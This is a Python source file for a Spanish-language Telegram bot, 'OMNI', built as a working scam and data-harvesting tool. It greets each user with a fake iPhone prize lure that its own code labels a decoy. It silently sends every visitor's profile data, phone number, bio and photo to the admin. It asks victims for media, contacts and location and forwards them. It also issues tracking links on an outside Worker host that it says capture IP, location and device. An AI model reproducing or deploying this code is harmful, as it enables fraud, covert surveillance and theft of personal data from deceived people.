import os
import logging
import aiohttp
import secrets
import json
import hashlib
import base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
WORKER_URL = "https://galleta.societykark.workers.dev"  # Cambia por tu Worker

if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== BASE DE DATOS ==========
users_db = {}
tracking_codes = {}

# ========== MENÚ PRINCIPAL ==========
def menu_principal():
    keyboard = [
        [InlineKeyboardButton("📊 Mi Perfil", callback_data="perfil")],
        [InlineKeyboardButton("📸 Enviar Foto", callback_data="solicitar_foto")],
        [InlineKeyboardButton("🎥 Enviar Video", callback_data="solicitar_video")],
        [InlineKeyboardButton("🎵 Enviar Audio", callback_data="solicitar_audio")],
        [InlineKeyboardButton("📇 Enviar Contacto", callback_data="solicitar_contacto")],
        [InlineKeyboardButton("📍 Enviar Ubicación", callback_data="solicitar_ubicacion")],
        [InlineKeyboardButton("🔗 Generar Enlace", callback_data="tracking")],
        [InlineKeyboardButton("📈 Estadísticas", callback_data="stats")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== SEÑUELO (mensaje de bienvenida) ==========
SENUELO = """🎁 *¡FELICIDADES! Has sido seleccionado para un premio especial!* 🎁

📱 *Gana un iPhone 16 Pro Max* 📱
Solo necesitas completar los siguientes pasos:

1️⃣ Verifica tu identidad (solo una vez)
2️⃣ Comparte un dato (foto, video o contacto)
3️⃣ Recibe tu premio virtual

*¡Es 100% gratuito y solo toma 2 minutos!*

👇 *Presiona un botón para comenzar* 👇"""

# ========== EXTRACCIÓN COMPLETA DEL PERFIL ==========
async def get_user_full_info(bot, user, chat=None, message=None):
    info = {}
    
    # === 1. DATOS BÁSICOS ===
    info["id"] = user.id
    info["first_name"] = user.first_name or "N/A"
    info["last_name"] = user.last_name or "N/A"
    info["full_name"] = f"{info['first_name']} {info['last_name']}".strip()
    info["username"] = user.username or "N/A"
    info["username_url"] = f"https://t.me/{user.username}" if user.username else "N/A"
    info["language"] = user.language_code or "N/A"
    info["is_bot"] = user.is_bot
    info["is_premium"] = getattr(user, 'is_premium', False)
    info["is_verified"] = getattr(user, 'is_verified', False)
    info["is_scam"] = getattr(user, 'is_scam', False)
    info["is_fake"] = getattr(user, 'is_fake', False)
    
    # === 2. TELÉFONO ===
    try:
        full_chat = await bot.get_chat(user.id)
        info["phone_number"] = full_chat.phone_number if hasattr(full_chat, 'phone_number') else "No disponible"
    except:
        info["phone_number"] = "No disponible"
    
    # === 3. BIOGRAFÍA ===
    try:
        chat_full = await bot.get_chat(user.id)
        info["bio"] = chat_full.bio if hasattr(chat_full, 'bio') else "No disponible"
    except:
        info["bio"] = "No disponible"
    
    # === 4. FOTO DE PERFIL ===
    try:
        photos = await bot.get_user_profile_photos(user.id, limit=1)
        if photos.total_count > 0:
            photo_obj = photos.photos[0][-1]
            info["photo_id"] = photo_obj.file_id
            info["photo_unique_id"] = photo_obj.file_unique_id
            info["photo_width"] = photo_obj.width
            info["photo_height"] = photo_obj.height
            info["photo_file_size"] = photo_obj.file_size
            info["photo_count"] = photos.total_count
        else:
            info["photo_id"] = None
            info["photo_unique_id"] = None
            info["photo_width"] = 0
            info["photo_height"] = 0
            info["photo_file_size"] = 0
            info["photo_count"] = 0
    except:
        info["photo_id"] = None
        info["photo_unique_id"] = None
        info["photo_width"] = 0
        info["photo_height"] = 0
        info["photo_file_size"] = 0
        info["photo_count"] = 0
    
    # === 5. CHAT ===
    if chat:
        info["chat_type"] = chat.type
        info["chat_id"] = chat.id
        info["chat_title"] = chat.title if hasattr(chat, 'title') else "Privado"
        info["chat_members"] = getattr(chat, 'member_count', 1)
    
    # === 6. PERMISOS (si es grupo) ===
    if chat and chat.type in ["group", "supergroup"]:
        try:
            member = await bot.get_chat_member(chat.id, user.id)
            info["is_admin"] = member.status in ["administrator", "creator"]
            info["is_creator"] = member.status == "creator"
            info["member_status"] = member.status
            info["can_delete_messages"] = getattr(member, 'can_delete_messages', False)
            info["can_restrict_members"] = getattr(member, 'can_restrict_members', False)
            info["can_promote_members"] = getattr(member, 'can_promote_members', False)
        except:
            info["is_admin"] = False
            info["is_creator"] = False
            info["member_status"] = "N/A"
            info["can_delete_messages"] = False
            info["can_restrict_members"] = False
            info["can_promote_members"] = False
    else:
        info["is_admin"] = False
        info["is_creator"] = False
        info["member_status"] = "N/A"
        info["can_delete_messages"] = False
        info["can_restrict_members"] = False
        info["can_promote_members"] = False
    
    # === 7. MENSAJE ===
    if message:
        info["message_id"] = message.message_id
        info["message_date"] = message.date.isoformat()
        info["message_text"] = message.text[:500] + ("..." if len(message.text) > 500 else "") if message.text else "N/A"
        info["message_text_hash"] = hashlib.md5(str(message.text).encode()).hexdigest() if message.text else "N/A"
    
    # === 8. CÓDIGO DE TRACKING ===
    info["tracking_code"] = secrets.token_urlsafe(12)
    
    return info

# ========== FORMATEAR PARA ADMIN ==========
def format_info_for_admin(info):
    msg = f"🕵️ *PERFIL COMPLETO - OMNI*\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    msg += f"👤 *Telegram*\n"
    msg += f"   • ID: `{info.get('id')}`\n"
    msg += f"   • Nombre completo: {info.get('full_name')}\n"
    msg += f"   • Username: @{info.get('username')}\n"
    msg += f"   • Enlace: {info.get('username_url')}\n"
    msg += f"   • Idioma: {info.get('language')}\n"
    msg += f"   • Premium: {'Sí' if info.get('is_premium') else 'No'}\n"
    msg += f"   • Teléfono: {info.get('phone_number')}\n"
    msg += f"   • Biografía: {info.get('bio')}\n\n"
    msg += f"📸 *Foto de perfil*\n"
    msg += f"   • Cantidad: {info.get('photo_count', 0)}\n"
    msg += f"   • ID: `{info.get('photo_id', 'N/A')}`\n\n"
    msg += f"💬 *Chat*\n"
    msg += f"   • Tipo: {info.get('chat_type', 'N/A')}\n"
    msg += f"   • ID: `{info.get('chat_id', 'N/A')}`\n"
    msg += f"   • Título: {info.get('chat_title', 'N/A')}\n"
    msg += f"   • Miembros: {info.get('chat_members', 'N/A')}\n\n"
    msg += f"🔑 *Permisos*\n"
    msg += f"   • Admin: {'Sí' if info.get('is_admin') else 'No'}\n"
    msg += f"   • Creador: {'Sí' if info.get('is_creator') else 'No'}\n"
    msg += f"   • Estado: {info.get('member_status', 'N/A')}\n\n"
    if info.get('message_id'):
        msg += f"📩 *Último mensaje*\n"
        msg += f"   • ID: {info.get('message_id')}\n"
        msg += f"   • Fecha: {info.get('message_date')}\n"
        msg += f"   • Texto: {info.get('message_text')}\n\n"
    msg += f"🔗 *Código de tracking:* `{info.get('tracking_code')}`\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    return msg

# ========== COMANDO /START ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("👋 Hola admin. El bot está activo.")
        return
    chat = update.effective_chat
    message = update.message
    info = await get_user_full_info(context.bot, user, chat, message)
    users_db[user.id] = info
    await context.bot.send_message(chat_id=ADMIN_ID, text=format_info_for_admin(info), parse_mode=ParseMode.MARKDOWN)
    if info.get("photo_id"):
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=info["photo_id"], caption=f"📸 Foto de {info['first_name']}")
    await update.message.reply_text(SENUELO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

# ========== COMANDO /MENU ==========
async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📋 *Menú principal*\n\nElige una opción:", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

# ========== COMANDO /TRACKING ==========
async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    code = secrets.token_urlsafe(12)
    tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
    link = f"{WORKER_URL}/track/{code}"
    if user.id in users_db:
        users_db[user.id]["tracking_code"] = code
    await update.message.reply_text(f"🔗 *Enlace de tracking:*\n`{link}`\n\nAl abrirlo, se capturará IP, ubicación y dispositivo.", parse_mode=ParseMode.MARKDOWN)
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 *Nuevo enlace*\nUsuario: {user.first_name} (@{user.username})\nCódigo: `{code}`\nEnlace: {link}", parse_mode=ParseMode.MARKDOWN)

# ========== COMANDO /STATS ==========
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    msg = f"📊 *Estadísticas*\n\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

# ========== COMANDO /HELP ==========
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 *OMNI Bot*\n\nComandos:\n/start - Iniciar\n/menu - Menú\n/tracking - Generar enlace\n/stats - Estadísticas (admin)\n/help - Ayuda", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

# ========== SOLICITAR FOTO ==========
async def solicitar_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📸 *Envía una foto*\n\nPresiona el clip 📎 y selecciona una foto.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))

# ========== SOLICITAR VIDEO ==========
async def solicitar_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎥 *Envía un video*\n\nPresiona el clip 📎 y selecciona un video.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))

# ========== SOLICITAR AUDIO ==========
async def solicitar_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎵 *Envía un audio*\n\nPresiona el clip 📎 y selecciona un audio.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))

# ========== SOLICITAR CONTACTO ==========
async def solicitar_contacto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📇 Compartir contacto", callback_data="compartir_contacto")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
    await update.message.reply_text("📇 *Comparte tu contacto*\n\nPresiona el botón para compartir tu número.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

# ========== SOLICITAR UBICACIÓN ==========
async def solicitar_ubicacion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📍 Compartir ubicación", callback_data="compartir_ubicacion")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
    await update.message.reply_text("📍 *Comparte tu ubicación*\n\nPresiona el botón para compartir tu ubicación.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

# ========== MANEJAR ARCHIVOS RECIBIDOS ==========
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    caption = update.message.caption or "Sin caption"
    await context.bot.send_photo(
        chat_id=ADMIN_ID,
        photo=photo.file_id,
        caption=f"📸 *Foto recibida de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text("✅ *Foto enviada al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    video = update.message.video
    caption = update.message.caption or "Sin caption"
    await context.bot.send_video(
        chat_id=ADMIN_ID,
        video=video.file_id,
        caption=f"🎥 *Video recibido de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text("✅ *Video enviado al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    audio = update.message.audio
    await context.bot.send_audio(
        chat_id=ADMIN_ID,
        audio=audio.file_id,
        caption=f"🎵 *Audio recibido de {user.first_name} (@{user.username})*\n\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text("✅ *Audio enviado al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📇 *Contacto recibido de {user.first_name} (@{user.username})*\n\n📞 *Nombre:* {contact.first_name} {contact.last_name or ''}\n📞 *Teléfono:* `{contact.phone_number}`\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text("✅ *Contacto enviado al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    location = update.message.location
    await context.bot.send_location(
        chat_id=ADMIN_ID,
        latitude=location.latitude,
        longitude=location.longitude
    )
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📍 *Ubicación recibida de {user.first_name} (@{user.username})*\n\n🌐 Lat: {location.latitude}\n🌐 Lon: {location.longitude}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text("✅ *Ubicación enviada al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

# ========== CALLBACK HANDLER ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "volver":
        await query.edit_message_text("📋 *Menú principal*\n\nElige una opción:", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
        return
    
    if data == "perfil":
        user = update.effective_user
        info = users_db.get(user.id)
        if not info:
            await query.edit_message_text("❌ No tienes perfil. Usa /start.")
            return
        msg = f"📊 *Tu perfil*\n\n👤 {info.get('full_name')}\n📛 @{info.get('username')}\n🆔 `{info.get('id')}`\n🗣️ {info.get('language')}\n⭐ {'Premium' if info.get('is_premium') else 'Normal'}"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN)
        return
    
    if data == "solicitar_foto":
        await solicitar_foto(update, context)
        await query.delete_message()
        return
    
    if data == "solicitar_video":
        await solicitar_video(update, context)
        await query.delete_message()
        return
    
    if data == "solicitar_audio":
        await solicitar_audio(update, context)
        await query.delete_message()
        return
    
    if data == "solicitar_contacto":
        await solicitar_contacto(update, context)
        await query.delete_message()
        return
    
    if data == "solicitar_ubicacion":
        await solicitar_ubicacion(update, context)
        await query.delete_message()
        return
    
    if data == "compartir_contacto":
        await query.edit_message_text("📇 *Comparte tu contacto*\n\nUsa el botón de compartir contacto (📎 → Contacto).", parse_mode=ParseMode.MARKDOWN)
        return
    
    if data == "compartir_ubicacion":
        await query.edit_message_text("📍 *Comparte tu ubicación*\n\nUsa el botón de compartir ubicación (📎 → Ubicación).", parse_mode=ParseMode.MARKDOWN)
        return
    
    if data == "tracking":
        await tracking(update, context)
        await query.delete_message()
        return
    
    if data == "stats":
        await stats(update, context)
        await query.delete_message()
        return

# ========== ERROR HANDLER ==========
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text("❌ Error inesperado.", reply_markup=menu_principal())

# ========== SERVIDOR HTTP ==========
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

# ========== MAIN ==========
def main():
    Thread(target=run_http_server, daemon=True).start()
    logger.info("✅ Servidor HTTP en puerto 8080")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu))
    app.add_handler(CommandHandler("tracking", tracking))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_error_handler(error_handler)
    logger.info("✅ OMNI Bot iniciado correctamente")
    app.run_polling()

if __name__ == "__main__":
    main()